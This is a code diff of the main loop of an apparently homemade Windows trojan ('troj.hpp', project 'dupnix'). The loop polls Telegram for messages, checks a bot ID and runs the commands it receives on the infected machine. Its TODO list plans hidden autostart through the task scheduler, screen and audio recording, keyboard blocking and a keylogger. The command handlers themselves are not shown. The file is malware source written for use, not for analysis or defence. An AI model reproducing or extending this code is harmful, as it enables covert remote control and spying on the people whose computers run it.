@@ -1,15 +1,10 @@
 ﻿#include <iostream>
-#include <string>
-#include <fstream>
 #include <time.h>
-#include <sstream>
-#include <nlohmann/json.hpp> //I used json cause propably in developing dupnix i will use it
+#include <nlohmann/json.hpp>
 #include <cpr/cpr.h>
-#include <opencv2/opencv.hpp>
 #include "troj.hpp"
 #include "commands.hpp"
 
-using namespace cv;
 using namespace std;
 using json = nlohmann::json;
 
@@ -23,9 +18,6 @@ int main() {
 	startup();
 
 	int last(-1); 	fstream file;
-	file.open("last", ios::in);
-	file >> last;
-	file.close();
 
 	while (true) {
 		Sleep(REFRESH * 1000);
@@ -35,9 +27,6 @@ int main() {
 		if (time(nullptr) - message["date"] > REFRESH + 3) continue; //continue if that request is too old
 
 		last = message["message_id"].get<int>();
-		file.open("last", ios::out);
-		file << last;
-		file.close();
 		
 		string id = "", command = "", parameters = "";
 		string parse = message["text"];
@@ -47,7 +36,7 @@ int main() {
 			continue;
 		}
 		queue<pair<string, string>> Q;
-		for (int i = 0, it = 0; i < parse.size(); i++)
+		for (int i = 0, it = 0; i < parse.size(); i++) //parsing message
 		{
 			if (parse[i] == ' ') {
 				it++; if(it <= 2)continue;
@@ -69,8 +58,6 @@ int main() {
 		}
 		Q.push({ command, parameters });
 
-		if (id.empty())continue;
-		bool done = true;
 		if (ID == id) { 
 		    cout << "ID passed, command: " + parse.substr(id.size()+1, TELEGRAM_MAX) << endl;
 			while (!Q.empty()) {
@@ -85,12 +72,12 @@ int main() {
 
 /*
 * TODOLIST
--autostart using task sheduler (easy admin acess)
--custom autostart path
+-clean up local files of project
 -make a handler for turing off
--sth like math() for math stuff like in py interpreter
--recording screen for some time
--recording audio for some time
--block keyboard
+-settings.json
+-make keylogger inside of dupnix
                         //////WHEN EVERYTHING UPPER WILL BE DONE THEN IT'S VERSION 3.0
+-learn git
+-start writing own app and api instead of telegram
+-make it still compatibile with telegram, just other main.cpp for telegram and other for app
 */
